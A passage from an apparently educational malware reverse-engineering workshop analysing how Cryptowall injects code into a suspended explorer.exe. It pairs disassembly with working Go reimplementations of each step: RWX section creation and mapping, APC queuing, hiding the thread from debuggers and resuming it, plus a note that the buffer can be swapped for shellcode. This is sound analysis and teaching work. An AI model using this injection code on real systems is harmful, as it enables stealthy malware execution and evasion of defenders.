</td><td colspan="1" rowspan="1"><p>RtlInitUnicodeString</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>1A0</p>
</td><td colspan="1" rowspan="1"><p>NtQuerySystemTime</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>1B4</p>
</td><td colspan="1" rowspan="1"><p>CreateProcessInternal</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>224</p>
</td><td colspan="1" rowspan="1"><p>CreateRemoteThread</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>228</p>
</td><td colspan="1" rowspan="1"><p>GetCommandLineW</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>22C</p>
</td><td colspan="1" rowspan="1"><p>AllocateAndInitializedSid</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>230</p>
</td><td colspan="1" rowspan="1"><p>CheckTokenMembership</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>234</p>
</td><td colspan="1" rowspan="1"><p>FreeSid</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>238</p>
</td><td colspan="1" rowspan="1"><p>LookupAccountSidW</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>23C</p>
</td><td colspan="1" rowspan="1"><p>GetUserNameW</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>294</p>
</td><td colspan="1" rowspan="1"><p>GetKeyboardLayoutList</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>298</p>
</td><td colspan="1" rowspan="1"><p>GetSystemMetrics</p>
</td></tr>
</table>
<h2 is-upgraded>Token Check</h2>
<p>In this same function (0x4016F00) there is a call to attempt to check the token for elevated privileges (0x409260). </p>
<h2 is-upgraded>Victim Fingerprinting</h2>
<p>As this was mentioned in the diagram, I will be brief here. Next you will see a function (0x4041C0) related to creating a new event for &#34;BaseNamedObjects&#34; and then a function doing the victim fingerprinting (0x404160). This event is created as a means for the malware to determine if it&#39;s a duplicate running process. Essentially it collects the victim information and hashes it to create the object name (i.e. \\BaseNamedObjects\\6224336787).</p>
<p>Cool, now that we go those out of the way, let&#39;s move on to actual injection part.s</p>


      </google-codelab-step>
    
      <google-codelab-step label="Injection Into Explorer: New Section Creation" duration="20">
        <h2 is-upgraded>Injecting Into Child Process explorer.exe (Function 0x40A680)</h2>
<p class="image-container"><img style="width: 610.00px" src="../peinjection/img/12517b65ec5bf16f.gif"></p>
<h3 is-upgraded>Querying the process</h3>
<p>The beginning of this function, there is a query to the process information to determine whether it is executing in the context of 32bit or 64bit architecture. This will determine whether to use explorer from System32 or SysWOW64 respective folders. The windows API used here is ZwQueryInformationProcess.</p>
<aside class="special"><p><strong>Note:</strong> For the remaining portion of this workshop I will share the windows API call function prototypes so that you can follow along with the function arguments. I will also provide the equivalent golang code.</p>
</aside>
<p><strong>Disassembly</strong></p>
<p class="image-container"><img style="width: 610.00px" src="../peinjection/img/780cdd844c26f054.png"></p>
<p><strong>Function Prototype</strong></p>
<pre><code>NTSTATUS WINAPI ZwQueryInformationProcess(
  _In_      HANDLE           ProcessHandle,
  _In_      PROCESSINFOCLASS ProcessInformationClass,
  _Out_     PVOID            ProcessInformation,
  _In_      ULONG            ProcessInformationLength,
  _Out_opt_ PULONG           ReturnLength
);</code></pre>
<p>Ref: <a href="https://docs.microsoft.com/en-us/windows/win32/procthread/zwqueryinformationprocess" target="_blank">https://docs.microsoft.com/en-us/windows/win32/procthread/zwqueryinformationprocess</a></p>
<p><strong>Golang</strong></p>
<pre><code>func IsSysWow64(ntdll syscall.Handle) (bool, error) {
        var pInfo uintptr
        pInfoLen := uint32(unsafe.Sizeof(pInfo))
        ZwQueryInformationProcess, err := syscall.GetProcAddress(
                syscall.Handle(ntdll), &#34;ZwQueryInformationProcess&#34;)
        if err != nil {
                return false, err
        }
        r, _, err := syscall.Syscall6(uintptr(ZwQueryInformationProcess),
                5,
                uintptr(windows.CurrentProcess()),        // ProcessHandle
                uintptr(windows.ProcessWow64Information), // ProcessInformationClass
                uintptr(unsafe.Pointer(&amp;pInfo)),         // ProcessInformation
                uintptr(pInfoLen),                       // ProcessInformationLength
                uintptr(unsafe.Pointer(&amp;pInfoLen)),      // ReturnLength
                0)
        if r != 0 {
                log.Printf(&#34;ZwQueryInformationProcess ERROR CODE: %x&#34;, r)
                return false, err
        }
        if pInfo != 0 {
                return true, nil
        }
        return false, nil
}</code></pre>
<h3 is-upgraded>Creating New Process</h3>
<p>Next it makes a call to CreateProcessInternalW which is an undocumented API call. This will create a new explorer.exe as a suspended child process.</p>
<p><strong>Disassembly</strong></p>
<p class="image-container"><img style="width: 610.00px" src="../peinjection/img/ae255565fe51aaa4.png"></p>
<p><strong>Function Prototype</strong></p>
<pre><code>BOOL
 WINAPI
 CreateProcessInternalW(IN HANDLE hUserToken,
                        IN LPCWSTR lpApplicationName,
                        IN LPWSTR lpCommandLine,
                        IN LPSECURITY_ATTRIBUTES lpProcessAttributes,
                        IN LPSECURITY_ATTRIBUTES lpThreadAttributes,
                        IN BOOL bInheritHandles,
                        IN DWORD dwCreationFlags,
                        IN LPVOID lpEnvironment,
                        IN LPCWSTR lpCurrentDirectory,
                        IN LPSTARTUPINFOW lpStartupInfo,
                        IN LPPROCESS_INFORMATION lpProcessInformation,
                        OUT PHANDLE hNewToken)</code></pre>
<p><strong>Golang</strong></p>
<pre><code>func CreateProcessInt(kernel32 syscall.Handle, procPath string) (uintptr, uintptr, error) {
        CreateProcessInternalW, err := syscall.GetProcAddress(
                syscall.Handle(kernel32), &#34;CreateProcessInternalW&#34;)
        if err != nil {
                log.Fatalln(err)
                return 0, 0, err
        }
        var si windows.StartupInfo
        var pi windows.ProcessInformation
        log.Println(procPath)
        r, a, err := syscall.Syscall12(uintptr(CreateProcessInternalW),
                12,
                0, // IN HANDLE hUserToken,
                uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(procPath))), // IN LPCWSTR lpApplicationName,
                0,                                 // IN LPWSTR lpCommandLine,
                0,                                 // IN LPSECURITY_ATTRIBUTES lpProcessAttributes,
                0,                                 // IN LPSECURITY_ATTRIBUTES lpThreadAttributes,
                0,                                 // IN BOOL bInheritHandles,
                uintptr(windows.CREATE_SUSPENDED), // IN DWORD dwCreationFlags,
                0,                                 // IN LPVOID lpEnvironment,
                0,                                 // IN LPCWSTR lpCurrentDirectory,
                uintptr(unsafe.Pointer(&amp;si)),      // IN LPSTARTUPINFOW lpStartupInfo,
                uintptr(unsafe.Pointer(&amp;pi)),      // IN LPPROCESS_INFORMATION lpProcessInformation,
                0)                                 // OUT PHANDLE hNewToken)
        if r &gt; 1 { // hack for error code invalid function
                log.Printf(&#34;CreateProcessInternalW ERROR CODE: %x&#34;, r)
                return 0, 0, err
        }
        log.Printf(&#34;%x %x %s %x&#34;, r, a, err, pi.Process)
        return uintptr(pi.Process), uintptr(pi.Thread), nil
}</code></pre>
<h3 is-upgraded>Creating and Writing to New Section</h3>
<p>Instead of unmapping the process image or hollowing out the process text section, Cryptowall instead creates a new section in explorer.exe, then maps the section in both the local and remote process. </p>
<p><strong>Disassembly</strong></p>
<p class="image-container"><img style="width: 610.00px" src="../peinjection/img/91eefdebbe300628.png"></p>
<p><strong>Function Prototype</strong></p>
<pre><code>NTSTATUS NtCreateSection(
  PHANDLE            SectionHandle,
  ACCESS_MASK        DesiredAccess,
  POBJECT_ATTRIBUTES ObjectAttributes,
  PLARGE_INTEGER     MaximumSize,
  ULONG              SectionPageProtection,
  ULONG              AllocationAttributes,
  HANDLE             FileHandle
);</code></pre>
<p><strong>Golang</strong></p>
<pre><code>func CreateNewSection(ntdll syscall.Handle, size int64) (uintptr, error) {
        var err error
        NtCreateSection, err := syscall.GetProcAddress(
                syscall.Handle(ntdll), &#34;NtCreateSection&#34;)
        if err != nil {
                return 0, err
        }
        var section uintptr
        r, a, err := syscall.Syscall9(uintptr(NtCreateSection),
                7,
                uintptr(unsafe.Pointer(&amp;section)), // PHANDLE            SectionHandle,
                FILE_MAP_ALL_ACCESS,               // ACCESS_MASK        DesiredAccess,
                0,                                 // POBJECT_ATTRIBUTES ObjectAttributes,
                uintptr(unsafe.Pointer(&amp;size)),    // PLARGE_INTEGER     MaximumSize,
                windows.PAGE_EXECUTE_READWRITE,    // ULONG              SectionPageProtection,
                SEC_COMMIT,                        // ULONG              AllocationAttributes,
                0,                                 // HANDLE             FileHandle
                0,
                0)
        if r != 0 {
                log.Printf(&#34;NtCreateSection ERROR CODE: %x&#34;, r)
                return 0, err
        }
        log.Printf(&#34;%x %x %s&#34;, r, a, err)
        if section == 0 {
                return 0, fmt.Errorf(&#34;NtCreateSection failed for unknown reason&#34;)
        }
        log.Printf(&#34;Section: %0x\n&#34;, section)
        return section, nil
}</code></pre>
<p>By mapping the section to both processes with <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwmapviewofsection" target="_blank">ZwMapViewOfSection</a>, you can easily write to the using a simple memcpy without calling ZwWriteVirtualMemory and updating the protection to allow execution. <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwcreatesection" target="_blank">NtCreateSection</a> already has execution protection flags (PAGE_EXECUTE_READWRITE)  to set on creation while calling ZwMapViewOfSection uses PAGE_READWRITE . Note that the malware uses -1 (0xFFFFFFFF) as the process handle, this indicates the current process. In the golang version, getting the current process handle is a little cleaner.</p>
<p><strong>Disassembly</strong></p>
<p class="image-container"><img style="width: 610.00px" src="../peinjection/img/4c31046cc1f17410.png"></p>
<p><strong>Function Prototype</strong></p>
<pre><code>NTSYSAPI NTSTATUS ZwMapViewOfSection(
  HANDLE          SectionHandle,
  HANDLE          ProcessHandle,
  PVOID           *BaseAddress,
  ULONG_PTR       ZeroBits,
  SIZE_T          CommitSize,
  PLARGE_INTEGER  SectionOffset,
  PSIZE_T         ViewSize,
  SECTION_INHERIT InheritDisposition,
  ULONG           AllocationType,
  ULONG           Win32Protect
);</code></pre>
<p><strong>Golang</strong></p>
<pre><code>func MapViewOfSection(
        ntdll syscall.Handle, section uintptr,
        phandle uintptr, commitSize uint32,
        viewSize uint32) (uintptr, uint32, error) {
        if phandle == 0 {
                return 0, 0, nil
        }
        var err error
        ZwMapViewOfSection, err := syscall.GetProcAddress(
                syscall.Handle(ntdll), &#34;ZwMapViewOfSection&#34;)
        if err != nil {
                return 0, 0, err
        }
        var sectionBaseAddr uintptr
        r, a, err := syscall.Syscall12(uintptr(ZwMapViewOfSection),
                10,
                section, // HANDLE          SectionHandle,
                phandle, // HANDLE          ProcessHandle,
                uintptr(unsafe.Pointer(&amp;sectionBaseAddr)), // PVOID           *BaseAddress,
                0,                                  // ULONG_PTR       ZeroBits,
                uintptr(commitSize),                // SIZE_T          CommitSize,
                0,                                  // PLARGE_INTEGER  SectionOffset,
                uintptr(unsafe.Pointer(&amp;viewSize)), // PSIZE_T         ViewSize,
                1,                                  // SECTION_INHERIT InheritDisposition,
                0,                                  // ULONG           AllocationType,
                windows.PAGE_READWRITE,             // ULONG           Win32Protect
                0,
                0)
        if r != 0 {
                log.Printf(&#34;ZwMapViewOfSection ERROR CODE: %x&#34;, r)
                return 0, 0, err
        }
        log.Printf(&#34;%x %x %s&#34;, r, a, err)

        return sectionBaseAddr, viewSize, nil
}</code></pre>
<p>If this routine fails, Cryptowall defaults to the regular NtAllocateVirtualMemory, ZwWriteVirtualMemory, NtProtectVirtualMemory routine to write to the target process&#39; memory.</p>
<h2 is-upgraded>How to view the new memory section</h2>
<p>After the section has been created and bytes have been written to that section base address, open process explorer from the sysinternals suite and a new instance of your debugger. </p>
<aside class="warning"><p><strong>Tip:</strong> Set a breakpoint after the call to memcpy (between the 2 ZwMapViewOfSection calls) or after the last call to ZwMapViewOfSection.</p>
</aside>
<p>In process explorer, identify the child process of the Cryptowall process which would be explorer.exe. In the new debugger instance attach to the explorer.exe process ID from what you saw in process explorer.</p>
<p class="image-container"><img style="width: 292.00px" src="../peinjection/img/e63e3a0ad89f29c5.png"></p>
<p>Go ahead and attach to explorer.exe.  Notice that the binary is 32 bit.</p>
<p class="image-container"><img style="width: 610.00px" src="../peinjection/img/a4e3e694400240a7.png"></p>
<p>In the Memory Map tab of the debugger, find the newly created section (this would be a base address populated from ZwMapViewOfSection)  in the memory list. This is typically at the end of the memory listing for explorer.exe. Another way to identify the memory section is that it&#39;s protection is execute, read, write. While the RWX protection is the primary red flag,  this section is mapped as Type MAP and that even though it is executable, it was not allocated initially as copy-on-write (ERWC), which means it is not backed by an image on disk.</p>
<p class="image-container"><img style="width: 610.00px" src="../peinjection/img/efa5131c3f309ec8.png"></p>
<p>As you can see below, Cryptowall decided to put the whole unpacked executable into memory.</p>
<p class="image-container"><img style="width: 605.73px" src="../peinjection/img/adda1fbf8bc194e.png"></p>
<p>Since this Cryptowall sample is also injecting position independent code I wanted to keep parity by showing a simple example. Now here is my golang code just injecting &#34;HELLO WORLD!&#34; into explorer.exe. Obviously you can trade out that byte buffer for some 32bit shellcode (I&#39;ve done this in the linked example code).</p>
<table>
<tr><td colspan="1" rowspan="1"><p class="image-container"><img style="width: 610.00px" src="../peinjection/img/e343a4a81792e53f.png"></p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p class="image-container"><img style="width: 548.00px" src="../peinjection/img/491cbedb4180013.png"></p>
</td></tr>
</table>


      </google-codelab-step>
    
      <google-codelab-step label="Injection Into Explorer: Spawning a New Thread" duration="20">
        <p>When function 0x40A680 was called, it passed an address to the ApcRoutine (0x413B40) that NtQueueApcThread intends on executing. Looking at the std call panel, you can see that the ApcRoutine is an address offset that exists in the new memory section. </p>
<p class="image-container"><img style="width: 170.00px" src="../peinjection/img/5124a451d1d26266.png"></p>
<p><strong>Disassembly</strong></p>
<p class="image-container"><img style="width: 610.00px" src="../peinjection/img/264380f568aa6d95.png"></p>
<p><strong>Function Prototype (Undocumented)</strong></p>
<pre><code>NTSYSAPI 
NTSTATUS
NTAPI
NtQueueApcThread(
  IN HANDLE               ThreadHandle,
  IN PIO_APC_ROUTINE      ApcRoutine,
  IN PVOID                ApcRoutineContext OPTIONAL,
  IN PIO_STATUS_BLOCK     ApcStatusBlock OPTIONAL,
  IN ULONG                ApcReserved OPTIONAL );</code></pre>
<p><strong>Golang</strong></p>
<pre><code>func QueueApcThread(ntdll syscall.Handle, thandle uintptr, funcaddr uintptr) error {
        var err error
        NtQueueApcThread, err := syscall.GetProcAddress(
                syscall.Handle(ntdll), &#34;NtQueueApcThread&#34;)
        if err != nil {
                return err
        }
        r, _, err := syscall.Syscall6(uintptr(NtQueueApcThread),
                5,
                thandle,  // IN HANDLE               ThreadHandle,
                funcaddr, // IN PIO_APC_ROUTINE      ApcRoutine, (RemoteSectionBaseAddr)
                0,        // IN PVOID                ApcRoutineContext OPTIONAL,
                0,        // IN PIO_STATUS_BLOCK     ApcStatusBlock OPTIONAL,
                0,        // IN ULONG                ApcReserved OPTIONAL
                0)
        if r != 0 {
                log.Printf(&#34;NtQueueApcThread ERROR CODE: %x&#34;, r)
                return err
        }
        return nil
}</code></pre>
<p>Then finally setting the ThreadInformationClass and resuming the main thread of the target process. Now I&#39;m not sure what the intent of using ThreadTimes (0x1) was here. I really think this may have been a typo on the malware author&#39;s part. Just adding one more 1 will change the ThreadInformationClass to ThreadHideFromDebugger (0x11) which is probably what they wanted otherwise it will keep throwing an error STATUS_INVALID_INFO_CLASS (0xC0000003).</p>
<p><strong>Disassembly</strong></p>
<p class="image-container"><img style="width: 610.00px" src="../peinjection/img/3c1dcafeac432313.png"></p>
<p><strong>NtSetInformationThread</strong></p>
<pre><code>__kernel_entry NTSYSCALLAPI NTSTATUS NtSetInformationThread(
  HANDLE          ThreadHandle,
  THREADINFOCLASS ThreadInformationClass,
  PVOID           ThreadInformation,
  ULONG           ThreadInformationLength
);</code></pre>
<p><strong>NtResumeThread</strong></p>
<pre><code>NTSYSAPI 
NTSTATUS
NTAPI
NtResumeThread(
  IN HANDLE               ThreadHandle,
  OUT PULONG              SuspendCount OPTIONAL );</code></pre>
<p><strong>Golang</strong></p>
<pre><code>func SetInformationThread(ntdll syscall.Handle, thandle uintptr) error {
        var err error
        NtSetInformationThread, err := syscall.GetProcAddress(
                syscall.Handle(ntdll), &#34;NtSetInformationThread&#34;)
        if err != nil {
                return err
        }
        ti := int32(0x11) //ThreadHideFromDebugger
        r, _, err := syscall.Syscall6(uintptr(NtSetInformationThread),
                4,
                thandle,     //         HANDLE          ThreadHandle,
                uintptr(ti), //   THREADINFOCLASS ThreadInformationClass,
                0,           //   PVOID           ThreadInformation,
                0,           //   ULONG           ThreadInformationLength
                0,
                0)
        if r != 0 {
                log.Printf(&#34;NtSetInformationThread ERROR CODE: %x&#34;, r)
                return err
        }

        return nil
}

func ResumeThread(ntdll syscall.Handle, thandle uintptr) error {
        NtResumeThread, err := syscall.GetProcAddress(
                syscall.Handle(ntdll), &#34;NtResumeThread&#34;)
        if err != nil {
                return err
        }
        r, _, err := syscall.Syscall(uintptr(NtResumeThread),
                2,
                thandle, //         IN HANDLE               ThreadHandle,
                0,       //   OUT PULONG              SuspendCount OPTIONAL
                0)
        if r != 0 {
                log.Printf(&#34;NtResumeThread ERROR CODE: %x&#34;, r)
                return err
        }
        return nil
}</code></pre>
<p>If the NtQueueApcThread routine failed, then Cryptowall will default to the good ol&#39;  CreateRemoteThread call. I didn&#39;t plan to go over this section but feel free to look at it on your own pace.</p>
<p><strong>Disassembly</strong></p>
<p class="image-container"><img style="width: 610.00px" src="../peinjection/img/dbfaa717607fece.png"></p>
<p class="image-container"><img style="width: 610.00px" src="../peinjection/img/6f24f51b8ae7dc24.png"></p>
<p><strong>Function Prototype</strong></p>
<pre><code>HANDLE CreateRemoteThread(
  HANDLE                 hProcess,
  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
  SIZE_T                 dwStackSize,
  LPTHREAD_START_ROUTINE lpStartAddress,
  LPVOID                 lpParameter,
  DWORD                  dwCreationFlags,
  LPDWORD                lpThreadId
);</code></pre>
<p>The intent of this workshop is to reverse engineer just enough to get you to the injection routine into explorer. Enjoy reversing!</p>
<p>Special thanks to reviewer <strong>Athena Cheung</strong>.</p>


      </google-codelab-step>
    
      <google-codelab-step label="Appendix" duration="0">
        <p>Here is the full golang code:</p>
<p><a href="https://github.com/malware-unicorn/GoPEInjection" target="_blank"><paper-button class="colored" raised>https://github.com/malware-unicorn/GoPEInjection</paper-button></a></p>
<p class="image-container"><img style="width: 610.00px" src="../peinjection/img/af83458e9a5f3eee.png"></p>


      </google-codelab-step>
    
  </google-codelab>

  <script src="//support.google.com/inapp/api.js"></script>
  <script src="../pkg/native-shim.js"></script>
  <script src="../pkg/custom-elements.min.js"></script>
  <script src="../pkg/prettify.js"></script>
  <script src="../pkg/codelab-elements.js"></script>

</body>
</html>
